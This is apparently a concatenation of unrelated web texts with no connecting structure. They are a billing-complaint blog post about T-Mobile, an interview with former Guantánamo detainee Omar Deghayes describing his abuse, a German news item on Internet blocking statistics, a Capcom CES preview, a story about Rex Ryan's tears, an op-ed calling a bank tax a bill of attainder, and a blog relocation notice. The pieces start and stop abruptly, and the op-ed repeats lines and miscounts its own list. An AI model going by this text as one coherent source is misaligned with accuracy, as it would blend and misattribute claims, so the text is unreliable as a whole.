Also not their strong point : being consistent about how they mark up dates .
Or how they decide what dates are important .
Oh and ... also not their strong point : matching reality .
So far they 've only actually charged me $ 63.71 , once , though I have in fact tried to pay more than once ( earlier today I also tried to pay the $ 62.42 that some of these pages claim I owe , though my bank has yet to see that charge ) .
Still , the $ 127.42 is a bit confusing .
Let 's see what the " View Bill " button under that number brings up .
Whaaaa !?
FPEvenMorePlus 500TTW $ 119.98 ?
What on earth is that ?
" Amount due 2/05 / 10 : $ 127.42 " ?
That completely contradicts the previous page !
How much do I owe on that day , $ 0 , or $ 127.42 ??
They say the way to work out how much you owe is to dial # 225 # from the phone , so let 's try that ...
Ok , that says $ 0 .
I guess the phone would know best .
I give up trying to work out how much I owe ; let 's instead try to get the " Unlimited Data " working on this phone .
I 've heard rumours that one has to buy a $ 0 optional extra " Unlimited Web " service since otherwise the " Even More Plus Unlimited Web " is actually limited .
Add additional services on this line ...
Internet & E- mail ...
Aha , here we go .
" T - Mobile Smartphone Unlimited Web with FlexPay " .
That sounds promising .
And it 's free !
Just like the rumours .
Let 's " buy " that and quickly review the charges :
Added plan and services ... $ 0 , yup .
Unchanged plan and services ... $ 59.99 .
Yup .
So , the grand total is ... $ 89.99 .
Wait , wait , hold on , let me recheck the maths here ...
$ 0 ... plus $ 59.99 ... carry the one ...
What ??
Ok , ok , clearly it got confused .
Let 's close the browser and start over .
Add additional services on this line ...
Internet & E- mail ...
" T - Mobile Smartphone Unlimited Web with FlexPay " .
And it says FREE .
So we click it again , and let 's see how much $ 59.99 + FREE equals this time :
TEN THOUSAND AND EIGHTY EIGHT DOLLARS AND NINETY NINE CENTS ?!
I give up .
I 'll try calling them tomorrow .
Pingbacks : 1
It is not hot stabbing pain that Omar Deghayes remembers from the day a Guantánamo guard blinded him , but the cool sen­sation of fingers being stabbed deep into his eyeballs .
He had joined other prisoners in protesting against a new humiliation – inmates ­being forced to take off their trousers and walk round in their pants – and a group of guards had entered his cell to punish him .
He was held down and bound with chains .
" I did n't realise what was going on until the guy had pushed his fingers ­inside my eyes and I could feel the coldness of his fingers .
Then I realised he was trying to gouge out my eyes , " Deghayes says .
He wanted to scream in agony , but was determined not to give his torturers the satisfaction .
Then the officer standing over him instructed the eye - stabber to push harder .
" When he pulled his hands out , I remember I could n't see anything – I 'd lost sight completely in both eyes . "
Deghayes was dumped in a cell , fluid streaming from his eyes .
The sight in his left eye returned over the following days , but he is still blind in his right eye .
He also has a crooked nose ( from being punched by the guards , he says ) and a scar across his forefinger ( slammed in a prison door ) , but otherwise this resident of Saltdean , near Brighton , appears ­relatively ­unscarred from the more than five years he spent locked in Guantánamo Bay .
Two years after his release , he speaks softly and calmly ; he has the unlined skin and thick hair of a man younger than his 40 years ; he has just remarried and has , for the first time in his life , a firm feeling that his home is on the clifftops of East Sussex .
Deghayes must , however , live with the darkness of Guantánamo for the rest of his days .
There are reminders everywhere , from the beautiful picture of Saltdean that was painted for him while he was incarcerated , to the fact that Guantánamo ­remains open 12 months after Barack Obama vowed to close it within a year .
There are still around 200 prisoners left in the detention camp , many of whom have been there for eight years .
Of the 800 freed , only one has been found guilty of any crime and he was convicted by a dubious military commission , a verdict that is likely to be overturned .
Deghayes , too , does not want to forget .
He says there is so much still to be ­exposed about the ­conditions there , and about British ­collusion in the ­extraordinary rendition and torture of men such as him in the months following the American - led ­invasion of Afghanistan in 2001 .
Deghayes , one of five children of a prominent Libyan lawyer , first came to Saltdean from Tripoli aged five , to learn English with his brothers and ­sisters on their summer holidays .
He would return and stay with British families every summer .
Then , in 1980 , his father , an opponent of the increasingly totalitarian Gaddafi , was taken away by the authorities .
Three days later , Deghayes ' uncle was told to ­collect his body from the morgue .
­Harassed and increasingly fearful for their safety , Deghayes ' mother sought asylum for her family in Britain .
They settled in the place they knew best , Saltdean , in a large white house with fine views over the sea .
More than two decades on , the family still lives there .
After a secular upbringing in ­Saltdean , Deghayes became a practising Muslim while at university in ­Wolverhampton , where he graduated in law .
When he finished studying to become a solicitor , he had a " longing " to return to Libya but could n't because of his family name and opposition to Gaddafi , so he left for a round - the - world trip to ­experience Arabic cultures and visit university friends .
He enjoyed ­Pakistan 's mixture of west and east , and was then tempted into a trip to ­Afghanistan : he saw business oppor­tunities and the chance to use his ­languages ( Farsi , Arabic and English ) and legal training ( understanding both western and Sharia law ) to help ­import - export companies .
He fell in love with the country and an Afghani woman ; they married and had a son .
" I liked the country – such beautiful rivers and different terrains .
The people were difficult to get to know at first , but if they knew you and liked you , they 'd open their hearts and houses to you , " he says .
Afghanistan , it seems , triggered many ambitious dreams : he says he helped set up a school in Kabul , assisted NGOs , ­experimented with an agricultural ­social enterprise and exported apples to Peshawar .
" I was generating income for myself but I had more ambition than that – to establish myself as a ­lawyer , " he says .
" Things were really good .
Then this war broke out and ­everything was shattered . "
Fearing for his new family 's safety , he paid people - smugglers to get them all back to Pakistan in early 2002 after the US - led invasion of Afghanistan .
He hoped his mother would take his wife and child back to England , while he planned to return to Afghanistan and continue his NGO and legal work .
" I still thought I had nothing to fear .
Even if there was an invasion , there was nothing I had been doing that was illegal . "
They rented a house in Lahore , " far away from the war atmosphere " .
But then the Americans began paying large amounts of money to find Arabs who had been in Afghanistan .
Suddenly , he was lucrative bounty for the Pakistani authorities .
" The atmosphere changed completely .
Nice Pakistan turned into a trap , " he says .
One day , their house was surrounded by armed police .
He was seized , but not taken to a ­normal police station .
Instead he was driven , fast and under heavily armed guard , between secure rooms in hotels and villas .
A Kafkaesque nightmare had begun .
Deghayes says he was beaten and ­interrogated first by Pakistani officials .
He thinks the Americans and the ­Libyans competed to " buy " him from the Pakistanis , and it appears the Americans won : when he was moved from Lahore to Islamabad , a man ­introduced himself as the head of the CIA 's Libyan section .
Taken between hotels by armed guards , Deghayes ­believes he saw a man who is now listed as a disappeared prisoner : an Italian Moroccan .
" I remember seeing him ; he was with me in the same car in Islamabad .
He came out crying from the meeting , scared ; he was saying , ' No , do n't do this to me . ' "
Deghayes also describes meeting a British interrogator when he met the CIA section head for the second time .
" I was facing the British man , who introduced himself as Andrew .
He spoke in an obvious British accent . "
According to Deghayes , Andrew said he was from the intelligence services and wanted to question him .
" I was really annoyed and said , ' You should n't do this , you 're helping these people – I 'm kidnapped , abducted against my will .
Your job is to get me out of here .
I'm British and if I go back to England , I will take you to court for what you are doing now . '
Andrew was a little bit scared , but he looked at me and said , ' What case would you bring against me ? '
I had nothing in my mind .
He said , ' Listen , if you answer my questions and co-operate with me , I will do my best .
I will get you out of there . ' "
Deghayes was shown an ­album of 100 photographs of supposed terrorists .
He says he did not recognise anyone .
One morning , he was tied , bound and blindfolded and taken to an airport .
The " thin black bag " was removed from his head : he was standing in front of a mirror , guarded by two US soldiers .
They tied another bag over his head , which " felt worse than the first bag – it suffocated me . "
It smelt " like socks or cheese , " he says .
" This was an indi­cation of the new regime – there were even harder times coming up . "
Inside the plane , it was mayhem : his feet and hands bound together and covered in bags , Deghayes was bundled on top of others in the hold .
" People were crying .
People were throwing up .
Some people were suffocating , and there was a kick here and a kick there : ' Get your head down , you bastard ! '
Things like that .
Then the plane took off and you could smell [ the guards ] drinking spirits . "
They landed in what he later ­realised was Bagram military air base .
Here , Deghayes ' clothes were taken away and he was given two pieces of blue uniform .
He was not allowed to speak to fellow inmates , and was bound to barbed wire before , he says , being beaten and made to suffer " all sorts of humiliation " .
He spent several months there .
" There were no rules in Bagram ; people just went in and kicked people if they did n't like them . "
He says he did not eat for more than 50 days .
" I was really sick ; I became a skeleton .
I could n't walk any more .
I lost my mind – I was really scared for my mental safety .
I tried to eat but I threw up .
I started to hear voices in my head because of the hunger .
People would say something and I could not understand what they were saying .
You hear shouts and you 're speaking to yourself inside your head .
I started to become really scared because I thought I was losing my brains and ­going crazy . "
While he was in Bagram , he was again interrogated several times by ­officials he believes were from Britain .
" They felt I was lying to them .
I said to them I studied in ­Holborn , London .
They said , ' Which train did you take to get there ? '
They did n't believe anything , " he says .
" They were n't free to do what they liked ; the Americans were running the show . "
When he said he was too sick to speak , they called him " a bandit " .
His British interrogators " came up with lots of ­stupid things " – suggesting the scuba­diving lessons he had taken in the shabby lido in Saltdean , within yards of his family home , were terrorist training .
" The Americans took that up in Guantánamo .
It was a big headache .
They showed me books of military ­scubadiving and ships and mines and they said , ' Which ones did you see ? ' "
The British also accused him of teaching people to fight in terrorist training camps in Chechnya , and claimed they had secret video evidence .
Deghayes had never been to ­Chechnya , and thought all these allegations ­laughable .
Only later did he discover through Clive Stafford Smith , director of the human rights charity Reprieve , that his apparent appearance in an ­Islamic terrorist training video in Chechnya was the crucial evidence in a flimsy case against him .
The ­authorities refused to give Stafford Smith , who campaigned for Guantánamo detainees , a copy of this videotape , but he eventually obtained one through the BBC .
It was , says the Reprieve director , an ­obvious case of mistaken identity : the person depicted lacked Deghayes ' small childhood scar on his face .
­Stafford Smith was able to show that the videotape was of a completely different ­person , actually a Chechnyan rebel called Abu Walid , who was dead .
" This was typical of the whole Guantánamo experience , " says Stafford Smith .
" They said they had evidence and they would n't let you see it .
Then when you did , it was incorrect . "
After two months in Bagram , Deghayes was flown to Guantánamo in autumn 2002 .
There , prisoners were treated brutally .
According to Deghayes , when guards physically subdued them by tying them down , they would " do actions to pretend as if they are raping you .
They put you down on your stomach .
It was really horrible , all sexual and psychological stuff . "
On other occasions , he says , guards would hold a prisoner 's head and " bang it on the floor " .
Deghayes developed a personal ­policy of resistance .
Guards would ­typically arrive at a prisoner 's cell and spray pepper and other chemicals through the " bean - hole " , the hatch in the door .
While most prisoners cowered at the back of their cell , Deghayes says he would grab the guards ' hands and attack them .
He fought back , as viciously as he could , trying to take the fights with guards out of the privacy of his cell and into the corridors .
" It was chaos ; they would fall on top of each other and it was embarrassing [ for them ] .
They were wearing all this heavy stuff [ body armour ] which did n't help either , " he says .
Some guards ­became afraid of going into his cell .
Most , he says , were Puerto Rican and were not driven by the patriotism of the " war on terror " .
They did not want to get hurt for their meagre wages .
Deghayes did not realise how badly his eye had been beaten until a year ­after the incident , when he looked in a mirror for the first time in four years .
He accepts his resistance caused him more physical pain , but believes it ­subsequently helped him .
In the camp , he was less fearful .
" I was targeted more , but I was also relaxed compared with others who did n't do that .
It was really scary for [ the guards ] to come into my cell , " he says .
" Being humiliated by getting beaten up is better than giving your own trousers out .
If I 'd done those things , I would 've been really bitter now .
I 'm probably less bitter than ­anyone else because I know I gave them a really hard time .
If I had given in , and all this was bottled up , I would have been like I see them [ other ex-prisoners ] – really bitter , full of hatred . "
Deghayes says his suffering made his faith stronger ; it helped him ­survive .
" We knew there 's a Muslim [ God ] ­behind things , there 's a hereafter , our patience and hardships will be ­rewarded and the pain has to end sometime .
Our religion teaches these things – the good always prevails and the bad is only temporary ; the patience of Job , the patience of Moses .
All these teachings make a difference . "
Praying five times a day delivered ­transcendence , removing him from the material world of bodily suffering .
" My body and physical being can be chained , can be tarnished , can be beaten , can be raped , " he says now , " but not the spiritual : that is something that nobody can bind down .
The spirit is what makes us who we are . "
As a campaign to free him gained momentum back in Brighton , Deghayes languished in Guantánamo for nearly six years .
He was never charged or convicted of anything , by any authority .
" And never been apologised to either , " he adds .
Finally , in August 2007 , the British government requested the ­release of Deghayes and four other ­detainees who were legal British ­residents .
In the month before his ­release in December 2007 , he says , he was deliberately fed well so he would not emerge looking gaunt and half - starved .
" For one month we were ­fattened up with milk shakes , ­chocolates and really good cakes . "
When he returned to his family in ­Saltdean , he was happy but also dis­orientated .
" You know if you are in a forest or walking on the moon , you can't tell what is what .
I was like this when I came out , " Deghayes says .
He was stunned by some of the changes in ­Britain .
" To my shock , when I came out from prison the whole country had changed – the surveillance , the Islamophobia , the control orders , secret ­evidence , and people being under ­curfews not being able to leave the house . "
His neighbourhood also ­appeared to have altered : " We never had thugs and mobs in the street ­before , and kids did n't go binge - drinking or stealing .
When I came back , these were some of the changes that I had to adjust to , " he says .
While he is very appreciative of the support he had in Brighton , after he was freed his family was targeted by racist teenagers who bullied his ­nephews and threw stones and bottles at their house for months .
This stopped , abruptly , after a community meeting and media coverage led the police , rather belatedly , to install a video camera in the window of their home .
His imprisonment also caused his marriage to break down .
His wife wrote to him in prison but her letters were never delivered ; nor were his to her .
" It 's cruel , is n't it ?
These were just ­normal letters between husband and wife . "
Both believed they had abandoned each other , and they divorced .
She now lives with her family in ­Afghanistan .
His son , Sulaiman , who is now eight , is staying with Deghayes ' mother in the Emirates .
They hope eventually to bring him to Britain and give him a western education .
Two years after he was released , Deghayes remarried in ­December and is now busy buying furniture for a new place in Brighton .
" Brighton is such a nice city .
You can just walk by the sea , and the fresh air comes across .
It ­reminds me of Tripoli .
­Before , I used to long for Tripoli ; now , only recently , I have started to prefer Brighton .
Maybe when you are younger you want to go back to dreams , and when you get to 40 you start to think , this is nicer , this is really what I like . "
Deghayes now works with ­Reprieve and other survivors of Guantánamo on legal challenges , ­including a civil case being brought against the Home Office with help from Gareth Peirce , the human rights lawyer .
Deghayes hopes there will be a public inquiry into Guantánamo to bring those to account who were ­involved in his interrogation .
Financial damages are not , he says , his ­motivation .
" Even if I get damages , I will give them to ­charity .
The court is an opportunity to embarrass and ­expose those who committed these crimes . "
While Reprieve campaigned to get Deghayes released , Stafford Smith ­explains how Deghayes " was a ­tremendously helpful ally in Guantánamo because he was fluent in English and he had a bit of legal training " .
Stafford Smith brought him legal textbooks but they were censored as a " threat " to national security , and he says he worried for Deghayes ' safety during his incarceration .
" If it had been me , I would have taken the course of quieter resistance .
I was always afraid for Omar , that he would get himself beaten up .
I was concerned for him ­because he was constantly being beaten up by the guards , but there 's nothing you can do to stop Omar loudly saying what is just and right . "
Stafford Smith believes
Deghayes has fared better than many veterans of Guantánamo since his release because he had the support of his family , an ­education – and because he has taken a very positive approach to his experiences .
" He 's not just sat back and taken it ; he 's tried to do something positive .
Omar works a lot with us to try to help other prisoners who are still in Guantánamo .
He 's also always been up for a good argument or a good ­debate . "
Deghayes appears remarkably calm ; but his brother , Abubaker , says he has noticed signs of trauma .
" His memory is not as good as it was .
He forgets to switch off lights .
If he opens a window , it stays open .
He stays up at night a lot , thinking . "
Abubaker is not surprised his brother struggles to sleep .
" Imagine the lights are on for six years . "
Has Deghayes changed as a person ?
" A lot of the things Omar had in his character seem to have deepened , like rebellion and resistance and not accepting oppression .
I think they became more rooted in him rather than being beaten out of him . "
But is n't he ever tempted to retreat to a quiet place , start his own business , and ­renounce the ­hassles of political campaigning ?
" I do n't want that life , " Deghayes says firmly .
" I never ­intended to live like that before imprisonment , and nor do I intend that after imprisonment .
I would not be true to ­myself if I did .
" Life is worth more .
It 's good to be a number in society rather than a zero .
There are many zeros around but every ­human is ­worthy of being a number , and I hope I will be something of a change for the good , rather than for harm and wars .
I hope so .
I really hope so . "
Die SPD - Bundestagsfraktion spricht sich für die Aufhebung des Sperrgesetzes für Internetseiten mit kinderpornographischen Inhalten aus .
Sie begründet dies , wie bereits berichtet , unter anderem damit , dass die Täter Staaten mit ausgebauter Internetinfrastruktur wie die USA oder die europäischen Länder bevorzugten .
In einem Schreiben , das heise online vorliegt , hatte das Bundeskriminalamt die SPD - Abgeordnete Edelgard Bulmahn , die damals Vorsitzende des Wirtschafts - und Technologieausschusses war , darüber informiert , dass Täter Staaten " mit intensiv ausgebauter Internet - Infrastruktur " bevorzugten .
Trotz der in diesen Staaten bestehenden Strafbarkeit und der dort herrschenden hohen Kontrolldichte nutzten die Täter diese Infrastruktur .
Um jedoch das Strafverfolgungsrisiko zu vermindern , wechselten sie häufig die Speicherorte .
Das BKA führt zwar keine eigenen statistische Erhebungen zu den Standorten solcher Server durch , konnte aber auf eine Auswertung von dänischen Strafverfolgern zurückgreifen .
Diese hatten im Zeitraum von Oktober 2008 bis Januar 2009 die von den dänischen Access - Blocking - Maßnahmen betroffenen Domains den jeweiligen Host - Ländern zugeordnet .
An erster Stelle benennt die dänische Polizei mit 1148 Servern die USA , bereits an zweiter Stelle listete sie Deutschland mit 199 Servern .
An dritter Stelle folgten die Niederlande mit 79 Servern , an vierter Stelle Kanada mit 57 Servern sowie Russland an fünfter Stelle mit 27 Servern .
Die weiteren Plätze belegten Japan , Korea , Tschechien und Großbritannien .
Das BKA weist darauf hin , dass die Strafbarkeit von Kinderpornografie in Dänemark weiter gefasst ist als in Deutschland .
In Dänemark liegt unter anderem das Schutzalter nicht wie hier bei 14 Jahre , sondern bei 18 Jahren .
Das BKA glaubt daher , dass " ein erheblicher Teil " der Webinhalte , die auf den dänischen Sperrlisten aufgeführt werden , nicht die Tatbestandsmerkmale des § 184 b StGb erfüllen würden .
Die Zahlen hätten insofern keine direkte Aussagekraft , um die Situation aus deutscher Sicht zu bewerten .
Gleichwohl lieferten die Daten einen Indikator zu den Serverstandorten ; Ursula von der Leyen , die als Initiatorin des Websperren - Gesetzes auftrat , hatte dagegen immer wieder davon gesprochen , dass die Server in Ländern zu finden seien , in denen es gar keine Gesetzgebung gegen Kinderpornos gebe – und damit sogar diplomatische Verstimmungen mit Indien ausgelöst .
Die Hintergrundinformationen des BKA lagen der SPD - Bundestagsfraktion bereits am 9 .
Juni vor – am 18 .
Juni wurde das Gesetz verabschiedet .
In der Debatte spielten die bis heute zurückgehaltenen Informationen erst jetzt eine Rolle , da die SPD die Aufhebung des Gesetzes fordert .
Inzwischen liegen auch die Antworten der Bundesregierung auf die Anfragen aus der SPD - Bundestagsfraktion vor .
Demnach seien die Überlegungen der Bundesregierung , wie kinderpornografische Inhalte für ein Jahr nun nicht gesperrt , sondern laut Koalitionsvertrag direkt gelöscht werden sollen , " noch nicht abgeschlossen " .
Auch hatte die Fraktion danach gefragt , ob dem Bundespräsidenten Horst Köhler , der bislang die Unterschrift verweigert , inzwischen ergänzende Informationen vorliegen .
Die Bundesregierung wollte dazu " aus Respekt vor dem Amt des Bundespräsidenten " dem Bundestag keine Antwort geben . ( jk )
Capcom had an impressive lineup at CES over in the Planet Hollywood suites .
We headed there to check out several new titles :
Dark Void
Mega Man 10
Final Fight : Double Impact
Tatsunoko vs. Capcom
Super Street Fighter IV
Monster Hunter Tri
MotoGP 09/10
Lost Planet 2
We first sat down and played four player co-op Lost Planet 2 ; a very impressive sequel .
We were thrust immediately into a boss fight that spanned an arena the size of a football field .
The boss was a giant armored monster that was knocking the four of us left and right ; the scope and scale of the battle was intense and felt cinematic .
Having three friends with you makes it possible to defeat the megalith , but it was not an easy fight .
In addition to the awesome four player co-op , you can fully customize your character –the image of which will remain persistent throughout the game , even showing up on friends ’ consoles .
Next we saw a game that we admit neither of us were expecting to be exciting : Monster Hunter Tri .
This Wii exlusive is the third game of the “ big in Japan ” Monster Hunter series .
In Monster Hunter Tri , you are a hunter who must take down huge and powerful monsters in order to gain fame , gear , food , and more .
You can choose to follow the main quest line , or leave town and roam the countryside to freelance it .
These battles are essentially entire games within themselves : expect monster battles to last a significantly long time .
The monster we watched was something to the tune of a 50 minute battle–and that ’s just one of hundreds of monsters available to hunt .
The battles themselves are strategic third person action smash - em- ups ; think God of War - style weapon swinging , grappling madness .
After you ’ve successfully hunted a monster , saw it up and use its guts , meat , and bones for gear upgrades , trade , and food .
If things are getting rough for a monster , it may call out for help .
In the battle we witnessed , the monster limped away , bellowed , and came back to the fight .
Suddenly , the mini-map showed a blue winged shape approaching from another zone ; the monster had summoned a draconic mega - beast to give it a hand .
Beat up a monster enough , and it may flee and try to lick its wounds .
Nobody said hunting giant monsters was easy .
Next , we meandered over to the siren call of Super Street Fighter IV , where we were shown the improvements and new characters that will make this the “ definitive ” version of SFIV .
Some of the new characters were blacked out in the press review copy that was playing at the suite , sorry to inform our superfans , but Cody and Guy from Final Fight will be in the game .
SSFIV will be less expensive than the original SFIV , in a nod to angry fans who felt cheated that such a major update is taking place so soon after the original SFIV .
Capcom Associate PR Manager Wes Phillips , as returning character C. Viper , decimated Icrontic reporter Charlotte Tarlitz ’s Juri with some exceptionally bold and brash combos that went into an amazing cinematic of her secret agent fire and shock suit basically ruining Juri ’s day .
The character art , cinematics , animation , and backgrounds are all as absolutely polished and astounding as can be .
Next we got to sit down with Tatsunoko vs. Capcom , a Wii exclusive fighter that mimics the style and craziness of the earlier Marvel vs. Capcom franchise .
For those who are n’t aware , Tatsunoko is basically a Japanese analogue of Marvel comics ; a full roster of nostalgic and current comic book heroes from the distant shores of the far East with a variety of superpowers and backstories .
Capcom claims that Tatsunoko vs. Capcom represents the pinnacle of online gaming for the Wii : matchmaking and online play are fully functional .
Here also is where we mention that Charlotte , playing as Morrigan and Ken the Eagle , made Brian , playing as Mega Man and Roll , pretty much look like a buffoon in front of all the nice Capcom people .
The spanking caused some psychological trauma that resulted in Brian referring to himself in the third person for a bit .
Brian sad .
Nothing , however , soothes a bruised ego like reliving your childhood and remembering the days of plowing quarters into arcade machines .
The “ Andre the Giant ” guys in pink polka - dot spandex are back in the new / old Final Fight : Double Impact–a dual release of the original arcade Final Fight and the Japan - only Magic Sword .
Both are sixteen bits of glory for us old gamers .
Enough fluff .
Brian was here for one thing and one thing only : Mega Man 10 .
Yes , we got to see all the names of the new robot masters .
Unfortunately , we told Capcom PR Specialist Jason
Allen that we would not reveal the names .
Suffice to say they are awesome .
We got to play a stage of an unannounced robot master that is baseball - themed .
Ballcap - wearing baseball robots pelted the Blue Bomber with robo - baseballs while Mega jumped through typically difficult screen after screen of robotic ballpark madness .
Whiney , spoiled gamers everywhere complained about the difficulty of Mega Man 9 .
To that , we say “ Call the Wahhhhhmbulance … ” Capcom , however , had a bit of a gentler response : Mega Man 10 will include an easier difficulty level that makes a few changes to the levels , such as covering up strategic spike ball pits or making some gaping chasms more easily surmounted .
Cry us a river , kids … back in our day , games were super hard , there were no quicksaves , and when you died , you threw the controller you were so pissed off .
Hard mode or bust .
The last game we looked at was MotoGP 09/10 .
While we ca n’t intelligently comment on the mechanics , gameplay , or realism of the title , we can say that Capcom most likely has the definitive GP motorcycle racing experience .
Instead of releasing just the 2009 season , they are calling the title 09/10 , and will update the game with free DLC updates as the 2010 season progresses .
Expect at least two DLC updates to bring the game current with the 2010 season .
All in all , we were impressed with Capcom ’s showing at CES .
While gaming is not usually considered a primary showstopper at the Consumer Electronics Show , we left Planet Hollywood pleased , knowing that Capcom has some serious fans and gamers working behind the scenes to provide fun , fan service , and quality sequels for our enjoyment .

FLORHAM PARK , N.J. -- Rex Ryan stepped to the podium and motioned for a staffer to hand him something .
It was a blue box of tissues , and the Jets coach set it down in front of him .
" I 've got a new sponsor , " Ryan said Wednesday , fighting a grin .
" The Jets have Toyota and I 've got Kleenex , for obvious reasons . "
Never afraid to show emotions , Ryan cried in front of his players during a team meeting Monday morning following New York 's 24 - 22 loss to Jacksonville on Sunday .
The story , first reported by the New York Post , has since generated both criticism and praise by fans and members of the media .
" Everything 's out and sometimes you say things to your team and you do n't realize that everybody will find out , " Ryan said .
" That 's fine and dandy .
One thing I 'll say is I 'll be true to myself . "
And that means being the guy who boldly declared he would someday lead the Jets to the Super Bowl -- something he reiterated Wednesday by saying " I believe I will be a champion here " -- and would have a team that the entire NFL would fear .
He says what 's on his mind , throwing caution to the wind .
Even if it includes shedding some tears .
" I'm man enough to be me , " Ryan said .
That means poking fun at himself -- and his players .
After putting his tissue box down , Ryan took out a piece of paper and took a playful shot at Mark Sanchez , who took some heat for awkwardly reading from a statement he wrote before his postgame news conference Sunday .
" Let me go ahead and get this out and read my statement I had , " Ryan said , smiling .
" It says here New England 's pretty good .
Any questions ?
OK . "
Saying he had just prepared some notes for the press but later realized it was a bad idea , Sanchez said he was wrong to have a prepared statement .
" I answer the questions and you guys ask the questions , " he said .
" That 's the rule .
I 'm not here to do your job , just like you 're not here to do mine .
That was n't the most respectful thing to you guys and ladies .
As much as I anticipate the questions and want to have an idea of what 's coming my way , it 's not my job to say , ' All right , the press conference is over . ' "
It 's not the first time Ryan has gotten emotional in front of his team .
He teared up after the Week 1 victory over Houston , and has had several rah-rah moments with his team before games .
" If I do n't fit the stereotype of coachspeak or anything else , so be it , " Ryan said .
" I 'm going to always be myself . "
The Jets have lost five of six after a 3 - 0 start , and take on AFC East - leading New England at Foxborough on Sunday .
Ryan acknowledged that the team might not have the swagger it did earlier in the season , but the players appreciated Ryan showing his feelings .
" It 's an emotional game and that just showed his passion , " linebacker Calvin Pace said .
" If I was in that situation , I would 've cried , too , man .
I guess when you play a sport like this , sometimes it 's shocking to see a grown man express emotion . "
Left guard Alan Faneca said the moment built up quickly and surprised the players , but left them feeling good about their coach , not embarrassed for him .
" No offense , but this is n't high school football anymore , " Faneca said .
" It 's a fun game , but it 's a serious game .
It 's a yearlong process and there are a lot of things that get built up and pent up .
I 've cried the year we won the AFC championship with Pittsburgh and went to the Super Bowl .
I was bawling after the game because it was my third chance after missing it a few times .
Those things build up . "
Patriots coach Bill Belichick would n't offer a reaction , but was asked if he has ever cried .
" I 've coached 35 years , so I 've probably covered most all the bases , " he said , pausing amid laughter .
" I think I swore once , too . "
Added New England quarterback Tom Brady : " I ca n't ever imagine Coach Belichick doing that in front of us . "
While some have argued that the tears showed that Ryan cares deeply , others say it 's a sign of insecurity and weakness -- that there 's no crying in football .
" My response is that a couple of four - letter words come to mind first , " Faneca said .
Right tackle Damien Woody said it really is much ado about nothing , and the players do n't care what others outside the facility think .
" You want to win for a coach like that , " Woody said .
" Whatever the perception is outside is irrelevant .
It means nothing .
We know how Rex feels about this team and what he was saying .
That 's the bottom line .
If people outside of here have a misconception of what happened , then , hey , that 's on them . "
Many of the players were also disappointed that the scene got out to the public .
" To be honest with you , that should never have left the meeting , " Pace said .
" What happens in - house needs to stay in - house .
That being said , I 've seen head coaches cry after wins and after losses .
I think they want so much for us and there 's only so much they can do . "
When asked if he was surprised at how big a deal the story had become , Ryan said he needed to grab a tissue and smiled .
" It 's more passion than it is anything else , " he said .
" It 's driven that way .
I have a strong belief in myself and this football team .
If that comes out , it comes out . "
Information from The Associated Press was used in this report .
The banking lobby plans to object to the Obama administration 's bank tax proposal on the grounds that it is unconstitutional .
We do n't hate this tax proposal .
But we cannot avoid coming to the conclusion that , unfortunately , the banks are probably right .
The notion that the banks might be able to defeat the bank tax on constitutional grounds is risible , annoying , and enervating .
But the world is often all those things .
We can laugh , complain , and collapse with exhaustion but , as we used to say back when I was doing M&A , “ it is what it is . ”
And what the bank tax is is an unconstitutional Bill of Attainder .
The constitution bars bills of attainder in Section 9 of Article I : “ No Bill of Attainder or ex post facto Law shall be passed . ”
This was a truly revolutionary departure from English law , which had featured Bills of Attainder since the fourteenth century .
But when the framers met in Philadelphia to write the constitution , they unanimously decided to ban them .
Despite the contentiousness of much of the constitutional debate , there was not one objection raised to the ban .
Thanks to this legal innovation , most of us are not very familiar with attainder .
Basically , it is a criminal conviction by the legislature rather than the judiciary , circumventing due process protections of the accused .
It is closely linked with “ ex post facto ” law making , since often the person was punished despite not having violated any law at all .
There is not a lot of US legal precedent when it comes to bills of attainder .
But what there is suggests that a bill of attainder might be said to have five elements :
Ex Post Facto :
It penalizes actions committed before the law is passed .
It penalizes actions committed before the law is passed .
Severe :
The penalty is severe enough that it is readily identifiable as punitive .
The penalty is severe enough that it is readily identifiable as punitive .
Punitive Intent :
It was passed with the intent to punish .
It was passed with the intent to punish .
No Legit Purpose :
There is no legitimate , non-punitive purpose for the law .
There is no legitimate , non-punitive purpose for the law .
Targeted :
It applies to an identifiable individual or group .
It applies to an identifiable individual or group .
Unavoidable :
The targets cannot change their behavior to avoid the penalty .
The new bank tax pretty clearly qualifies under each of these elements .
Ex Post Facto :
The tax attaches to banks that took TARP funds that were offered by the government to shore up the financial system .
This was — and remains — perfectly legal .
Yet now banks are being penalized for participating in the government program .
Severe :
The tax is expected to confiscate hundreds of billions of dollars from the banks , which surely qualifies it as severe .
Courts have found that to be the punitive confiscation of property .
Punitive Intent : Obama ’s remarks introducing the tax proposal sounded very vindictive to almost everyone who has heard it .
Joe Biden emailed Coakley supporters in Massachusetts that Scott Brown 's opposition to the tax was " a perfect opportunity to show where his loyalties lie -- with working families in Massachusetts or with the bankers on Wall Street who helped lead us into the mess we 're in -- guess who he chose ? "
That 's the language of punishment for the financial crisis .
No Legit Purpose :
There ’s no other legitimate purpose to the tax but to punish banks for being bailed out .
It will probably be argued that the tax will reduce risk at banks — but if that were anything more than a pretext the tax would be permanent rather than expiring when the TARP is fully repaid .
And the government cannot argue that the purpose is the collection of revenue — that would be an absurdly broad rationale that would exempt any confiscation , fine or tax from the ban on Bills of Attainder .
Targeted :
The tax is obviously targeted at the large banks that took TARP .
No one expects the list of banks that qualify for the tax to grow , and Obama ’s proposal actually exempts the automaker TARP recipients .
The courts have ruled that corporations count as individuals who cannot be targeted in this way , so there ’s no getting around it by saying Bank of America is n’t a person .
And just because there are dozens of banks that will be taxed does n’t mean it is too broad to qualify — the Supreme Court once ruled that a law aimed at the entire membership of the communist party counted as a Bill of Attainder .
Unavoidable :
There ’s nothing the banks can do to avoid the tax .
No management changes or better risk controls will exempt them .
There is literally no new regulation to comply with in order to avoid the penalty .
They ’re stuck with the taint of TARP .
In short , the bank tax looks an awful lot like it should qualify as a Bill of Attainder .
This means that lawmakers conscientious of their constitutional obligations should refuse to allow the tax to become law .
The president , once he is made aware of the attainder issue , should not sign it into law .
And the courts should strike it down .
Whether or not any of that will happen is another issue .
Lawmakers seem eager to show the public they can stand up to the banking lobby , and a punitive tax is just the ticket for that .
Obama has n’t shown any signs that he is open to being persuaded by arguments about the constitutionality of his proposals .
And successful court challenges on attainder grounds are rare .
Hi all ,
This post has moved .
Sorry for not redirecting you myself !
WordPress.com is a bit dumb when it comes to that .
Or click on the picture of spock :)
